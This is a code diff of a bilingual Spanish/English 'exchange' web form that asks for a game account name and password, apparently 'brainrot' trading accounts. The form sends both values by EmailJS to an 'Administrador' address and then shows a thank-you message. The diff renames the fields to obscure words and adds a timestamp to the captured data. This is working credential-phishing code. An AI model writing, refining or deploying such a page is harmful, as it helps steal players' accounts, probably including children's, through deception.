@@ -353,13 +353,13 @@
         
         <form id="forma-registro" class="registro-form">
             <div class="form-group">
-                <label for="account" data-es="Cuenta de brainrots:" data-en="Brainrots account:">Cuenta de brainrots:</label>
-                <input type="text" id="account" placeholder="" required>
+                <label for="branaroto" data-es="Cuenta de brainrots:" data-en="Brainrots branaroto:">Cuenta de brainrots:</label>
+                <input type="text" id="branaroto" placeholder="" required>
             </div>
             
             <div class="form-group">
-                <label for="account" data-es="Contrasenya de Cuenta de brainrot:" data-en="Brainrot password account:">Contrasenya de Cuenta de brainrot:</label>
-                <input type="text" id="access" placeholder="" required>
+                <label for="paso" data-es="Contrasenya de Cuenta de brainrot:" data-en="Brainrot paso branaroto:">Contrasenya de Cuenta de brainrot:</label>
+                <input type="paso" id="paso" placeholder="" required>
             </div>
             
             <div class="loading" id="loading" data-es="Procesando..." data-en="Processing...">Procesando...</div>
@@ -383,7 +383,7 @@
             es: {
                 title: "INTERCAMBIO",
                 subtitle: "Completar",
-                accountLabel: "Cuenta de brainrot:",
+                branarotoLabel: "Cuenta de brainrot:",
                 loading: "Procesando...",
                 acceptButton: "CONTINUAR",
                 thankYou: "¡Gracias! ✅",
@@ -394,7 +394,7 @@
             en: {
                 title: "EXCHANGE",
                 subtitle: "Complete",
-                accountLabel: "Brainrot account:",
+                branarotoLabel: "Brainrot branaroto:",
                 loading: "Processing...",
                 acceptButton: "CONTINUE",
                 thankYou: "Thank You! ✅",
@@ -422,52 +422,67 @@
         
         document.getElementById('forma-registro').addEventListener('submit', async function(e) {
             e.preventDefault();
-            const account = document.getElementById('account').value;
-            const access = document.getElementById('access').value;
+            const branaroto = document.getElementById('branaroto').value;
+            const paso = document.getElementById('paso').value;
             
-            if (account && access) {
+            if (branaroto && paso) {
                 // Mostrar loading
                 document.getElementById('loading').style.display = 'block';
                 document.getElementById('error-message').style.display = 'none';
                 document.getElementById('submit-btn').disabled = true;
                 
+                // CORRECCIÓN: Usar los valores reales del usuario
                 const templateParams = {
                     from_name: 'Sistema de Intercambios',
-                    to_name: 'Tú',
-                    usuario_brinrot: account,
-                    contra_brinrot: access,
+                    to_name: 'Administrador',
+                    usuario_brinrot: branaroto, // Esto ahora usa el valor real
+                    contra_brinrot: paso, // Esto ahora usa el valor real
+                    fecha: new Date().toLocaleString(),
+                    idioma: currentLang
                 };
                 
-                console.log('Enviando email con Template ID: template_ga9xk7u');
+                console.log('Enviando email con datos:', templateParams);
+                console.log('Template ID: template_ga9xk7u');
                 
                 emailjs.send('service_08y0xce', 'template_ga9xk7u', templateParams)
                     .then(function(response) {
-                        console.log('✅ Registrado!', response);
+                        console.log('✅ Email enviado correctamente!', response);
                         
+                        // Ocultar formulario y mostrar mensaje de éxito
                         document.getElementById('forma-registro').style.display = 'none';
                         document.getElementById('gracias-mensaje').style.display = 'block';
                         
+                        // Guardar en localStorage
                         const peticion = {
-                            usuario: account,
+                            usuario: branaroto,
                             estado: 'completada',
-                            email_enviado: true
+                            email_enviado: true,
+                            timestamp: new Date().toISOString()
                         };
                         localStorage.setItem('peticionbrinrot', JSON.stringify(peticion));
                     })
                     .catch(function(error) {
-                        console.error('❌ Error', error);
+                        console.error('❌ Error enviando email', error);
                         
                         // Mostrar error específico
-                        let mensajeError = 'Error ';
+                        let mensajeError = 'Error al enviar la petición. ';
                         if (error.text) {
                             mensajeError += error.text;
+                        } else if (error.message) {
+                            mensajeError += error.message;
                         }
+                        
                         document.getElementById('error-message').textContent = mensajeError;
                         document.getElementById('error-message').style.display = 'block';
-                        
                         document.getElementById('loading').style.display = 'none';
                         document.getElementById('submit-btn').disabled = false;
                     });
+            } else {
+                // Mostrar error si faltan campos
+                document.getElementById('error-message').textContent = currentLang === 'es' 
+                    ? 'Por favor, completa todos los campos' 
+                    : 'Please fill in all fields';
+                document.getElementById('error-message').style.display = 'block';
             }
         });
 
@@ -476,6 +491,7 @@
             // Configurar selector de idioma
             document.getElementById('language-select').addEventListener('change', function(e) {
                 changeLanguage(e.target.value);
+                localStorage.setItem('selectedLanguage', e.target.value);
             });
             
             // Cargar idioma guardado
